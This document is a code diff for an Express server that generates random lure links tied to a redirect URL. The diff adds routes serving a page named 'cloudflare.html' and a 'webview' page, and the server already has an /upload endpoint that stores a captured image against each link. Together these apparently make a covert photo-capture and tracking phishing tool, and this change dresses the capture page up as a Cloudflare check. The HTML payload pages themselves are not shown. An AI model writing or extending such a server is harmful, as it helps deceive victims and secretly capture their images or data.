@@ -1,3 +1,4 @@
+require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const mongoose = require('mongoose');
@@ -26,23 +27,42 @@ app.post('/generate', async (req, res) => {
   try {
     const { originalUrl, redirectUrl } = req.body;
     const host = req.get('host');
-    const newUrl = `https://${host}/${Math.random().toString(36).substring(7)}`;
+    const newUrl = `${host}/${Math.random().toString(36).substring(7)}`;
     const url = new Url({ originalUrl, newUrl, redirectUrl });
     await url.save();
     console.log('URL saved:', url);
-    res.json({ newUrl });
+
+    const cloudflareUrl = `https://${host}/c/${newUrl}`;
+    const webViewUrl = `https://${host}/w/${newUrl}`;
+
+    res.json({ cloudflareUrl, webViewUrl });
   } catch (error) {
     console.error('Error generating URL:', error);
     res.status(500).send('Server error');
   }
 });
 
-app.get('/:id', async (req, res) => {
+app.get('/c/:id', async (req, res) => {
   try {
     const id = req.params.id;
-    const url = await Url.findOne({ newUrl: `https://${req.get('host')}/${id}` });
+    const url = await Url.findOne({ newUrl: id });
     if (url) {
-      res.sendFile(path.join(__dirname, 'public', 'capture.html'));
+      res.sendFile(path.join(__dirname, 'public', 'cloudflare.html'));
+    } else {
+      res.status(404).send('Not Found');
+    }
+  } catch (error) {
+    console.error('Error fetching URL:', error);
+    res.status(500).send('Server error');
+  }
+});
+
+app.get('/w/:id', async (req, res) => {
+  try {
+    const id = req.params.id;
+    const url = await Url.findOne({ newUrl: id });
+    if (url) {
+      res.sendFile(path.join(__dirname, 'public', 'webview.html'));
     } else {
       res.status(404).send('Not Found');
     }
@@ -63,7 +83,7 @@ app.post('/upload', async (req, res) => {
       if (err) {
         return res.status(500).send('Error saving image');
       }
-      const url = await Url.findOne({ newUrl: `https://${req.get('host')}/${id}` });
+      const url = await Url.findOne({ newUrl: id });
       if (url) {
         url.imagePath = filePath;
         await url.save();
